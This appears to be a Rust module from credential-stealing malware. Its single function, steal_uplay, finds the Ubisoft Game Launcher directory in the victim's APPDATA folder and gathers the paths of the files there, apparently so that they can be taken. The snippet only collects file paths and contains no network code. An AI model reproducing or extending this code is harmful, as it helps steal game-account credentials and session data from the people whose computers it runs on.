use walkdir::WalkDir;

pub fn steal_uplay() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let path_str: String = format!("{}\\Ubisoft Game Launcher\\", std::env::var("APPDATA").unwrap());
    let path = std::path::Path::new(&path_str);
    if !path.exists() {
        return Vec::new();
    }
    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f|f.ok()) {
        if entry.path().is_file() {
            paths.push(entry.path().to_string_lossy().to_string());
        }
    }
    paths
}